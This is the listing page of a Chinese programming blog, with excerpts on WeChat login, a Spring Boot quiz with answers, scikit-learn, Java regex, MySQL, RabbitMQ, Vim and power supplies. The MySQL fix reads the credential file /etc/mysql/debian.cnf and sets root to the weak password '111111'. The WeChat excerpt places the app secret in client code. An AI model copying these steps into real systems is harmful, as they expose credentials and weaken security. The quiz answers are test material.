<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程爱好者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程爱好者博客">
		<meta property="og:title" content="编程爱好者博客" />
<meta property="og:description" content="编程爱好者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bchobby.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程爱好者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程爱好者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/262e25000443a72848ee499d0910aa49/" rel="bookmark">
			微信小程序授权登录获取用户的openid
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		小程序可以通过微信官方提供的登录能力方便地获取微信提供的用户身份标识，快速建立小程序内的用户体系然而因为小程序中的openid不可以直接使用需要用code（登录凭证）去换取openid 获取openid的思路 获取openid首先需要调用小程序的login方法获取小程序的登录凭证code,然后使用code向微信换取登录态信息,包括用户的唯一标识(openid)及本次登录的会话密钥(session_key)
我这里是用一个点击事件来触发一个函数 wx.getUserProfile 会获取到你的一些信息 比如昵称，头像，性别 info(){ // 推荐使用wx.getUserProfile获取用户信息，开发者每次通过该接口获取用户个人信息均需用户确认，开发者妥善保管用户快速填写的头像昵称，避免重复弹窗 wx.getUserProfile({ desc: '获取用户的信息',//获取用户的信息 success:(res)=&gt; {//用户成功授权 console.log("成功",res) this.setData({ userInfo: res.userInfo, hasUserInfo: true, nickName:res.userInfo.nickName, //获取昵称 touxian:res.userInfo.avatarUrl, 获取头像url sex:res.userInfo.gender //获取性别 }) }, fail:res=&gt;{ console.log("失败",res) } }) }, 下图看打印
wx.login 可以获取到你的code值 wx.login({ //成功放回 success:(res)=&gt;{ console.log(res); let code=res.code } }) 下图看打印
通过wx.request 来让code换取openid
这里面需要一段很长的url地址
https://api.weixin.qq.com/sns/jscode2session?appid=APPID&amp;secret=SECRET&amp;js_code=JSCODE&amp;grant_type=authorization_code 这个地址可以在开发文档=&gt;服务器=&gt;登录中 找到
不要以为你把这个路径cv上就好了 这段连接中有三处地方需要改动
（每个人的id都不一样所以你要自己去作修改 下面有修改处的位置）
wx.request({ /* url: 'https://api.weixin.qq.com/sns/jscode2session?appid=' + APPID + '&amp;secret=' + SECRET + '&amp;js_code=' + res.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/262e25000443a72848ee499d0910aa49/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ee1bc708560f97342c76c92a0d253d3d/" rel="bookmark">
			Spring Boot基础 习题【附答案】6
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		悄悄感谢一下某位老铁
一.单选题（共22题,100.0分） 1
在Spring Data JPA中,如何删除两个实体之间的关联关系?
A、将相关属性设置为null。B、使用cascade属性将关联关系级联删除。C、使用DELETE语句从数据库中删除关联关系。D、调用removeRelationship方法。 我的答案：A得分： 4.5分
2
在双向关联中,为了确保数据一致性,应该采取哪些步骤?
A、只需在一个方向上更新关联关系即可B、关系的导航方向与数据一致性无关C、可以随意选择关联的导航方向D、需要在两个方向上都正确更新关联关系 我的答案：D得分： 4.5分
3
在Spring Data JPA中,@JoinColumn注解用于指定什么?
A、外键的值B、外键列的名称C、目标实体的名称D、实体属性的名称 我的答案：B得分： 4.5分
4
在Spring Data JPA中,如何创建一个新的关联关系?
A、使用JOIN语句来创建关联关系。B、通过设置相关实体之间的属性来建立联系。C、通过@Relation注解来定义关联关系。D、使用EntityManager的createRelationship方法。 我的答案：B得分： 4.5分
5
在Spring Data JPA中,如何创建一个新的关联关系?
A、使用以下代码片段创建关联关系:employee.setDepartment(department); employeeRepository.save(employee);B、通过调用createRelationship方法来创建关联关系。C、使用JOIN语句来创建关联关系。D、使用自定义SQL查询创建关联关系。 我的答案：A得分： 4.5分
6
在Spring Data JPA中,如果要更新两个实体之间的关联关系,应该如何操作?
A、使用以下代码片段更新关联关系:employee.setDepartment(newDepartment); employeeRepository.save(employee);B、使用merge方法来更新关联关系。C、通过调用updateRelationship方法来更新关联关系。D、创建一个新的关联关系并删除旧的关联关系。 我的答案：A得分： 4.5分
7
在Spring Data JPA的多对一关联关系中,@ManyToOne注解通常放在哪一端的实体属性上?
A、可以在两端都放置B、拥有方(Owning Side)C、被拥有方(Inverse Side)D、无关紧要 我的答案：B得分： 4.5分
8
Spring Data JPA中的CascadeType的作用是什么?
A、用于指定外键的名称。B、用于指定级联操作,例如保存或删除。C、用于指定关联关系的加载策略。D、用于控制事务的传播行为。 我的答案：B得分： 4.5分
9
在Spring Data JPA中的双向一对多关联中,哪一端通常使用mappedBy属性?
A、被拥有方(Inverse Side)。B、双向关联不需要使用mappedBy。C、拥有方(Owning Side)。D、可以在两端都使用。 我的答案：A得分： 4.5分
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ee1bc708560f97342c76c92a0d253d3d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3483ff058deda3dad41fa7925fab2dac/" rel="bookmark">
			scikit-learn
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 优缺点 在大家的日常生活中，无论是工作还是学习，scikit-learn都占有举足轻重的地位！先聊聊它的优缺点，让大家有一个整体的认识！
1.1. 优点 简单易用：scikit-learn提供了一种简单而一致的API，使用户能够轻松地训练、评估和部署各种监督学习模型。丰富的文档和示例：详尽的文档和示例，以帮助用户理解算法和如何使用它们，这降低了学习曲线。广泛的算法支持：包括多种监督学习算法，从传统的线性模型到集成方法和深度学习，满足了各种问题的需求。开源社区支持：强大的开源社区，用户可以获得支持、反馈和贡献新功能和改进。性能优化：库中的算法通常经过高度优化，以提供高性能的计算，特别是在大规模数据集上。数据预处理工具：包括数据预处理、特征工程和特征选择工具，有助于准备和处理数据。交叉验证和模型选择：提供了交叉验证和模型选择工具，有助于选择最佳模型参数，避免过拟合。可扩展性：用户可以轻松地扩展库，自定义评估器、转换器和度量。 1.2. 缺点 有些算法的性能：尽管scikit-learn包括广泛的算法，但某些特殊问题可能需要更专业的库或深度学习框架来实现最佳性能。深度学习支持限制：虽然scikit-learn包括MLP（多层感知机）等神经网络模型，但对于深度学习任务，深度学习框架如TensorFlow和PyTorch可能更适合。自动特征工程：自动特征工程工具有限，复杂的特征工程任务可能需要其他库或手动处理。处理大规模数据集的能力：对于大规模数据集，scikit-learn的性能和内存管理可能存在挑战。不支持序列数据：对于时序数据或自然语言处理任务，需要额外的库和工具。 有了一个整体的认识之后，专门针对监督学习算法，各个举例，给出大家完整可以抛出结果的代码示例来。
2. 监督学习 线性模型
线性与二次判别分析
核脊回归
支持向量机
随机梯度下降
最近邻
高斯过程
横向分解
朴素贝叶斯
决策树
组合：梯度增强，随机森林，装袋，投票，堆叠
多类与多输出算法
特征选择
半监督学习
等张回归
概率标定
神经网络模型（监督）
2.1. 线性回归 线性回归案例中，包括准备数据、构建模型、训练模型、预测、评估和可视化。
导入所需的库，包括NumPy、Matplotlib以及Scikit-Learn的相关模块。加载波士顿房价数据集，选择平均房间数作为特征（这里仅选取了一个特征用于简化示例）。划分数据集为训练集和测试集，这是为了评估模型的性能。创建并训练线性回归模型，使用训练数据进行拟合。使用模型进行预测，预测测试集中的房屋价格。评估模型性能，计算均方误差（MSE）和决定系数（R^2）。最后，通过可视化，绘制了实际数据点和线性回归模型的拟合线，以便直观地了解模型的性能。 # 导入必要的库 import numpy as np import matplotlib.pyplot as plt from sklearn import datasets from sklearn.linear_model import LinearRegression from sklearn.model_selection import train_test_split from sklearn.metrics import mean_squared_error, r2_score # 加载波士顿房价数据集 boston = datasets.load_boston() # 准备数据 X = boston.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3483ff058deda3dad41fa7925fab2dac/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/21a54fdfac1758afb13bbd84db082cc0/" rel="bookmark">
			Java 正则表达式数字篇
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如果需要根据特定的规则来表示一组字符串，则用正则表达式。正则表达式可以用字符串来描述规则，并用来匹配字符串
Java 提供了标准库 java.util.regex ，可以很方便的使用正则表达式。
如果正则表达式有特殊字符，那就需要用 \ 转义，后续会提到。
数字 匹配数字 用 \d 可以匹配一位数字，写法是 \\d ,
String regex1 = "\\d\\d\\d"; System.out.println("110".matches(regex1)); // true System.out.println("119".matches(regex1)); // true System.out.println("120".matches(regex1)); // true System.out.println("1200".matches(regex1)); // false System.out.println("12F".matches(regex1)); // false 是否是 11 位数字，常用场景是判断手机号，
String regex2 = "\\d{11}"; System.out.println("12345678900".matches(regex2));// true System.out.println("123456789001".matches(regex2));// false System.out.println("1234567890a".matches(regex2));// false System.out.println("A2345678900".matches(regex2));// false 匹配非数字 用 \D 匹配一位非数字，写法是 \\D ，
String regexD = "\\D\\D"; System.out.println("66".matches(regexD));// false System.out.println("1*".matches(regexD));// false System.out.println("1@".matches(regexD));// false System.out.println("1#".matches(regexD));// false System.out.println("$$".matches(regexD));// true 匹配0-9的数字 用 [0-9] 可以匹配一位数字，
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/21a54fdfac1758afb13bbd84db082cc0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/daa382fecb125f11386e43bfef579872/" rel="bookmark">
			MySQL:ERROR 1698 (28000): Access denied for user ‘root’@’localhost’
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 问题描述
出现场景：这个问题一般出现在刚刚安装完MySQL的时候
出现原因：由于使用命令sudo apt-get install mysql安装时,并没有提示输入密码,则密码没有初始化,使用root用户登录自然失败.
具体情况：
mysql -u root -p Enter password: ERROR 1698 (28000): Access denied for user 'root'@'localhost' 解决方法
思路：既然密码没有初始化，那么直接使用默认密码登录就可以了。
步骤如下：
1.使用cat命令查看默认用户名密码。
sudo cat /etc/mysql/debian.cnf 展示出来的内容：
2.使用默认用户名密码登录
mysql -udebian-sys-maint -p Enter password: Welcome to the MySQL monitor. Commands end with ; or \g. …… mysql&gt; 登录成功。
3.修改PLUGIN设置（出现这个问题的原因就在这）
注意，这里是在MySQL登录进去以后，在MySQL命令提示符后面执行如下命令：
mysql&gt; UPDATE mysql.user SET authentication_string=PASSWORD('111111'), PLUGIN='mysql_native_password' WHERE USER='root'; 设置完成。
4.重启服务
/etc/init.d/mysql stop /etc/init.d/mysql start 5.登录
使用新的密码111111登录数据库：
mysql -u root -p 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bed151df49812a2a038825c6a3155f62/" rel="bookmark">
			利用MATLAB创建栅格地图(代码可复制)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先做一个声明：文章是由我的个人公众号中的推送直接复制粘贴而来，因此对智能优化算法感兴趣的朋友，可关注我的个人公众号：启发式算法讨论。我会不定期在公众号里分享不同的智能优化算法，经典的，或者是近几年提出的新型智能优化算法，并附MATLAB代码。
“有不少的同学利用智能优化算法搞路径规划，往往需要创建栅格地图，这里分享两段MATLAB创建栅格地图的代码~”
路径规划需要环境建模，环境建模的目的是模拟现实场景，将物理空间复刻到抽象空间，建立一个可以并且便于计算机处理的环境模型。环境建模其实质就是将算法需要处理的约束条件与物理环境中的障碍物等进行一一映射，并且使路径搜索的情况可以直观的展示在虚拟场景中。机器人路径规划的重要环节之一就是建立一个环境模型了，方便直观地展现出路径规划的场景和规划结果。
建立环境模型的基本要求就是计算机便于存储、处理和使用。在路径规划方面最常用的图形学环境建模方法有几何法和栅格法。这里介绍一下栅格法。
栅格法根据比例和分割要求，将模拟环境进行分割，划分成若干相同的栅格，然后针对每个栅格设置环境参数，根据实际或假设环境，设置其中各个栅格障碍物的情况。栅格法处理的环境模型所得栅格数据结构实际就是一张二维表，因此栅格地图在计算机中是比较容易创建和维护的。由于栅格地图是按照一定的规则划分的，所以很容易将其转移到坐标系下，这样障碍物的位置和可行区域就能更加直观的展示出来，通过行列来显著标识各位置信息。
栅格法建模的优点：在栅格地图中，每个位置都可由坐标点来确定，该位置状态也可由具体数据来表示。栅格地图很容易于在计算机中进行存储、更新与分析，且该方法已在许多机器人系统中得到了成功应用。
01
随机生成 原理其实很简单，随机生成一个01矩阵，1就表示障碍物，指定起点和终点后，画出来就行了。障碍物以概率来生成，这个概率可以自己定义。比如，以0.3的概率随机生成障碍物的40×40的实例，那么在40×40=1600个格子中，有0.3×1600=480个格子是障碍物，画成黑色。
MATLAB代码如下(可直接复制粘贴)：
%% 栅格地图创建 %% %% By 后会无期 %% %% 2023.10.24 %% %% 关注微信公众号：启发式算法讨论 %% %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% clear clc %% 以"Probability"的概率生成m×n的栅格图障碍物环境 Probability=0.2; % 设置障碍区概率(可自行更改) m=30;n=30; % 设置地图的大小(可自行更改) R=rand(m,n); % 初始化一个m×n的[0,1]之间随机矩阵，用来生成矩阵G G=zeros(m,n); % 初始化一个m×n的零矩阵，后续用来存储地图 for i=1:m for j=1:n if R(i,j)&lt;=0.2 G(i,j)=1; % 1表示障碍物 else G(i,j)=0; % 0表示无障碍 end end end % 规定起点和终点(可自行更改) G(1,1)=0; G(m,n)=0; %% 画栅格地图 figure; axis([0,m,0,n]); for i=1:m for j=1:n % 计算小方框的四个顶点的横、纵坐标 x1=j-1;y1=n-i; x2=j;y2=n-i; x3=j;y3=n-i+1; x4=j-1;y4=n-i+1; % 绘制栅格图 if G(i,j)==1 fill([x1,x2,x3,x4],[y1,y2,y3,y4],[0,0,0]); hold on else fill([x1,x2,x3,x4],[y1,y2,y3,y4],[1,1,1]); hold on end end end % 画起点图标(可自行更改) fill([0,1,1,0],[n-1,n-1,n,n],[1,0,0]); % 画终点图标(可自行更改) fill([m-1,m,m,m-1],[0,0,1,1],[0,0,1]); 比如以0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bed151df49812a2a038825c6a3155f62/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4a89c8a0225febebb018429a9624cc66/" rel="bookmark">
			【RabbitMQ】RabbitMQ 消息的可靠性 —— 生产者和消费者消息的确认，消息的持久化以及消费失败的重试机制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言：消息的可靠性问题一、生产者消息的确认1.1 生产者确认机制1.2 实现生产者消息的确认1.3 验证生产者消息的确认 二、消息的持久化2.1 演示消息的丢失2.2 声明持久化的交换机和队列2.3 发送持久化的消息 三、消费者消息的确认3.1 配置消费者消息确认3.2 演示 none 模式3.3 演示 auto 模式 四、消息消费失败的重试机制4.1 本地重试机制4.2 失败消息的处理策略 前言：消息的可靠性问题 在现代分布式应用程序中，消息队列扮演了至关重要的角色，允许系统中的各个组件之间进行异步通信。这种通信模式提供了高度的灵活性和可伸缩性，但也引入了一系列的挑战，其中最重要的之一是消息的可靠性。
首先让我们来了解一下，在消息队列中，消息从生产者发送到交换机，再到队列，最后到消费者，有哪些情况会导致消息的丢失？
发送时丢失：
生产者发送的消息未送达交换机；消息到达交换机后未到达队列； MQ 宕机，队列中的消息会丢失；
消费者接收到消息后未消费就宕机了。
确保消息队列的可靠性是分布式系统中不可或缺的一部分，因此我们需要采取措施来应对这些挑战。为了解决上述消息可靠性问题，RabbitMQ提供了一系列的机制和最佳实践，以确保消息在整个传递过程中得到妥善处理和保护。
本文将深入探讨如何应对这些挑战，介绍消息队列中的关键概念，并详细讨论 RabbitMQ 提供的解决方案，包括生产者消息的确认、消息的持久化、消费者消息的确认以及消息消费失败的重试机制。这些措施将有助于确保消息队列在应用程序中的可靠性和稳定性。
一、生产者消息的确认 1.1 生产者确认机制 RabbitMQ 提供了 publisher confirm 机制，这是一种用于解决消息发送过程中可能出现的丢失问题的机制。当消息发送到 RabbitMQ 后，系统会返回一个结果给消息的发送者，以指示消息的处理状态。这个结果有两种可能的值：
publisher-confirm，发送者确认：
消息成功投递到交换机，系统返回 ack（确认）。消息未能成功投递到交换机，系统返回 nack（未确认）。 publisher-return，发送者回执：
消息成功投递到交换机，但是没有成功路由到队列，系统返回 ACK，同时提供路由失败的原因。 这个确认机制的目的是确保消息在发送到消息队列后，发送者能够获得有关消息处理状态的明确反馈，从而可以采取适当的措施，例如重发消息或记录失败信息。
需要注意的是，为了实现这一机制，需要为每条消息设置一个全局唯一的标识符，以便区分不同的消息，避免在确认过程中出现冲突。
例如下图所示：
确保消息生产者能够获得有关消息状态的反馈是确保消息可靠性的关键一步，因为它有助于解决消息可能在发送期间丢失的问题。这是构建可靠的消息队列系统中的重要组成部分。
1.2 实现生产者消息的确认 下面将通过一个 Java 的 Spring Boot 项目来演示如何实现生产者消息的确认。这个项目的结构如下：
这个项目有两个模块，其中 consumer 负责对消息的消费，而 publisher 负责发送消息。下面是在 publisher 模块中实现消息确认的具体步骤：
在 publisher 服务中的 application.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4a89c8a0225febebb018429a9624cc66/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/da2a32edddf51965b735606b84cd9b04/" rel="bookmark">
			软件学报排版样例2021版
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		软件学报排版格式样例 软件学报官网下载的文章都是PDF版的，因此就算把它转成word，也会发现格式是乱的，根本不是实际上的格式，所以必须要原版的word才能查看格式，但是原版论文咱们是肯定拿不到的，官网说下载区有，但是不知道为什么我找不到下载区在哪儿！烦死了！！！ 经过苦苦查询终于找到一个能够直接下载的官方排版样例，ps：找得我好苦，记得点赞！！！ 废话不多说，直接把下载链接放这了！ 主打一个热情分享哈哈。
点击此处进入
我看了一下，格式都是对得上的，应该没问题的。记得点赞哈！！！辛苦找的~
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8042b6624e1323c90d9ca0be0d811ce2/" rel="bookmark">
			Vim使用(一)——常用技巧及快捷键总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、常用配置二、搜索替换常用方法三、复制粘贴和删除常用方法四、多窗口文件处理五、多窗口缓存区六、格式化代码七、修改二进制文件八、大小写转换 一、常用配置 普通用户的vim配置在vim ~/.vimrc中，以下是我的常用配置，其他配置可以参考这两篇博客：vim常用设置、vim 自动配置。
set mouse-=a syntax on "语法高亮 set nocompatible "去除VI一致性,必须要添加 set nu "显示行号 set autowrite "自动保存 set ruler "打开状态栏标尺 set cursorline "突出显示当前行 set smartindent "开启新行时使用智能自动缩进 set hlsearch "搜索高亮 set incsearch "渐进式搜索 set nobackup "不需要备份文件 set noswapfile "不创建临时交换文件 set nowritebackup "编辑的时候不需要备份文件 set noundofile "不创建撤销文件 " Tab键更改为2个空格 "set ts=2 "set sw=2 "set expandtab "set autoindent " 配置tags查找路径 set tags=./tags,tags;$HOME "自动补全 :inoremap ( ()&lt;ESC&gt;i :inoremap ) &lt;c-r&gt;=ClosePair(')')&lt;CR&gt; :inoremap { {}&lt;ESC&gt;i :inoremap } &lt;c-r&gt;=ClosePair('}')&lt;CR&gt; :inoremap { {&lt;CR&gt;}&lt;ESC&gt;O :inoremap } &lt;c-r&gt;=ClosePair('}')&lt;CR&gt; :inoremap [ []&lt;ESC&gt;i :inoremap ] &lt;c-r&gt;=ClosePair(']')&lt;CR&gt; :inoremap "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8042b6624e1323c90d9ca0be0d811ce2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ecf8784a95e6c70ac33b6568644193ff/" rel="bookmark">
			隔离和非隔离电源的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、电源隔离与非隔离 电源的隔离与非隔离，主要是针对开关电源而言，业内比较通用的看法是：
1、隔离电源：电源的输入回路和输出回路之间没有直接的电气连接，输入和输出之间是绝缘的高阻态，没有电流回路。
2、非隔离电源：输入和输出之间有直接的电流回路，例如，输入和输出之间是共地的。 1.1 安全性 隔离电源的输入和输出之间有一层绝缘材料，通常是隔离变压器。
隔离电源是使用变压器将220V电压通过变压器将电压降到较低的电压，然后再整流成直流电输出供电使用。因为变压器的主线圈承受220V电压，次级线圈只承受输出的低交流电压，并且主次线圈之间并不直接连接，所以称为隔离电源。变压器的转换过程是：电-磁-电，没有和大地连接，所以不会发生触电危险。
非隔离电源没有电气隔离，而是将输入电路电源直接连接到输出电路电源。
非隔离电源是用220V直接输入到电子电路，在通过电子元件降压输出，输入输出是通过电子元件直接连接的，所以称非隔离电源;两者从表面上看就是有无变压器的区别。LED非隔离设计仅限于双绝缘产品，例如灯泡的替代产品，其中LED和整个产品都集成并密封在非导电塑料中，因此，最终用户并没有任何触电的危险。二级产品都是隔离型的，价格相对比较昂贵。非隔离电路是输入电源通过升降压之后直接加在了LED负载上，有触电危险存在。
所以要通过安规认证，比如3C、UL、CE等，非隔离就麻烦，一般生产厂家没有绝对的设计技术实力，一般不好通过。因为绝缘及爬电距离不够，只能从灯具物理结构设计了。灯管是可以接受的，也有全塑的，比如，通常LED和铝散热器之间的绝缘也就靠铝基板的印制板的薄膜绝缘。虽然这个绝缘层可以耐 2000V高压，但有时螺丝孔的毛刺会产生所谓的爬电现象，使得难以通过CE认证。
但作为完整的LED照明灯具产品，产品表面使用者能接触到的部分一定要经过隔离，不能让人触电。而从产品整个系统而言，隔离是不可避免的，区别只是设置隔离的位置不同。作为一个让最终用户能安全使用的产品，一定会考虑绝缘与隔离的可靠性。
注意：需要提醒的是，有些厂家为了节省成本，采用在主线圈上直接抽头提取低电压的办法，这种办法看似有变压器，实际没有次级线圈，不能算是隔离电源！
1.2 电性能 从性能上说，隔离电源的优点是：不会对人体造成威胁，宽电压表现很好，电压范围略比隔离的差些，非隔离的电压范围在110V-300V之间；而隔离电源能做到60-300V。高低电流很均匀。隔离型驱动安全但效率较低，非隔离型驱动效率较高，应按实际使用的要求来选隔离型还是非隔离型驱动。
从恒流精度上：隔离型可以做到±5%以内，而非隔离型则很难做到。
非隔离电路对于浪涌十分敏感，抑制能力差。雷击浪涌，这种电压是瞬间高压，高达几千伏，时间很短，能量极强，这个电压进入电源，对于非隔离BUCK 电路，会瞬间传达到输出，击坏恒流检测环，或是进一步击坏芯片，造成300V直通，而烧掉整条灯管。事实上就是指非隔离电源，在批量出货时，返修率高于隔离LED驱动电源，大都是因为炸坏。而隔离电源炸坏的机率要小不少，非隔离的一般在2%至3%左右。
很多电网电压不稳，隔离也会，现象也是芯片、MOS管、恒流环路全烧坏，但隔离相对少得多。
注意：所以非隔离防浪涌的压敏电阻必不可少，没有压敏能质保的都是浮云。
1.3. 成本与效率 电子产品的成本不光是设计生产成本，批量大的产品也包括维修成本。就LED电源电路结构而言，目前的隔离型方案多是AC/DC的反激式 (Flyback)电路方案，因此相对电路较复杂、成本较高。非隔离型基本是采用DC/DC的升压(Boost)或降压(Buck)电路，则相对电路较简单，因而成本也相对较低。
非隔离由于少了变压的能损耗，效率一般能达到90%以上，而且有更高的功率因素。而隔离一般能效在88%，视功率而定，所以隔离电源发热也比较大。
非隔离电源在效率和成本上比隔离电源较有优势。隔离电源效率不易做高,处理不好的话热量很大,成本也高,尤其是做那种内置灯管的LED日光灯。但非隔离电源,因为对雷击浪涌电压抑制能力较差,大批量出货时,就会遇到很多损坏。
相比隔离电源，非隔离电源主要是减少了变压器，以最少的用料来设计架构，做到相同的产品功能，所以非隔离成本有较大的优势。这估计就是非隔离电源在中国很吃香的原因了。
注意：在低压供电的LED灯具中，以效率和成本优先的原则，其实非隔离型方案是最佳的选择。
二、隔离电源与非隔离电源的优缺点 由上述概念可知，对于常用的电源拓扑而言，非隔离电源主要有：Buck、Boost、Buck-Boost等；而隔离电源主要有各种带隔离变压器的反激、正激、半桥、LLC等拓扑。
结合常用的隔离与非隔离电源，我们从直观上就可得出它们的一些优缺点，两者的优缺点几乎是相反的。
使用隔离或非隔离的电源，需了解实际项目对电源的需求是怎样的，但在此之前，可了解下隔离和非隔离电源的主要差别：
1、隔离模块的可靠性高，但成本高，效率差点。
2、非隔离模块的结构很简单，成本低，效率高，安全性能差。
因此，在如下几个场合，建议用隔离电源：
1、涉及可能触电的场合，如从电网取电，转成低压直流的场合，需用隔离的AC-DC电源;
2、串行通信总线通过RS-232、RS-485和控制器局域网(CAN)等物理网络传送数据，这些相互连接的系统每个都配备有自己的电源，而且各系统之间往往间隔较远，因此，我们通常需要隔离电源进行电气隔离来确保系统的物理安全，且通过隔离切断接地回路，来保护系统免受瞬态高电压冲击，同时减少信号失真;
3、对外的I/O端口，为保证系统的可靠运行，也建议对I/O端口做电源隔离。
三、隔离与非隔离电源的应用场合 通过了解隔离与非隔离电源的优缺点可知，它们各有优势，对于一些常用的嵌入式供电选择，我们已可做成准确的判断：
1、系统前级的电源，为提高抗干扰性能，保证可靠性，一般用隔离电源。
2、电路板内的IC或部分电路供电，从性价比和体积出发，优先选用非隔离的方案。
3、对安全有要求的场合，如需接市电的AC-DC，或医疗用的电源，为保证人身的安全，必须用隔离电源，有些场合还必须用加强隔离的电源。
4、 对于远程工业通信的供电，为有效降低地电势差和导线耦合干扰的影响，一般用隔离电源为每个通信节点单独供电。
5、 对于采用电池供电，对续航力要求严苛的场合，采用非隔离供电。
从LED电源的角度进行分析：
用隔离的绝缘变压器还是用隔离的防护灯罩外壳，通常需要从多方面去分析，例如成本与製造工艺、效率和体积、绝缘可靠性和安全规范的要求等。这两种类型的设计都将会继续使用，因为每个设计分别满足了不同的市场需求。
从负载范围说，一般来讲隔离电源的输出带载范围为30-42V，非隔离带载范围可以为30-84V。众多LED厂家在选择电源的时候为了整体的适应性都要求电源能够适应全电压90-265V输入，带载范围也要求高达84V，这样的选择是存在一定风险和隐患的。90V输入的时候电源可能丧失恒流功能，THD这些。非隔离适合做高压小电流，做大电流成本并不比隔离的便宜。
非隔离电源适合的场合：首先是室内的灯具，这种室内用电环境较好，浪涌影响小，草帽和贴片LED，使用的场合是高压小电流。低压大电流用非隔离没有意义，因为低压大电流非隔离的效率并不比隔离的高，成本也低不到多少去，不太适合集中式照明，何谓集中照明，即在同一条AC线上点上几百只灯具，这时因为一条线上灯具太多，此条线上电压环境较脏，所以击坏灯具的机率变大，故非隔离电源做的LED灯具。
从产品整个系统而言，隔离是不可避免的，区别只是设置隔离的位置不同。有些设计者採用隔离的变压器设计，因此他们可以简化散热和灯罩的设计（散热的设计怎么简化啊？隔离的效率低热量就大啊，只是简化灯具隔离设计吧？）。如果用非隔离的驱动设计，在灯壳等结构上就必须考虑可靠的绝缘要求。
注意：作为电源驱动，隔离与非隔离的方案一直都同时存在。
缘于上述几点，这两种架构的电源各有优势，非隔离电源侧重于较高的功率因数及效率，减少了能源的损耗；而隔离电源重视生命的安全和日光灯整体的使用安全性，在功率因数及效率方面略逊于非隔离电源，不同场合和不同使用环境，不同的电源类型没有硬性规定。
四、隔离电源与非隔离电源该如何选择 非隔离电源一是效率，二是成本上比较有优势。这和隔离电源比起来都是优势，隔离电源效率不易做高，处理不好热量很大，成本也高，尤其是做那种内置灯管的LED日光灯，真可谓成本上天。
但非隔离电源，因为对雷击浪涌电压抑制能力较差，大批量出货时，就会遇到较多损坏的因素。不过浪涌问题始终都存在，很多隔离电源，如路灯电源，用于室外的，点不久，也是坏的很多，隔离电源很多时候也是被浪涌打的够呛，分享一些经验和规律，供大家参考。
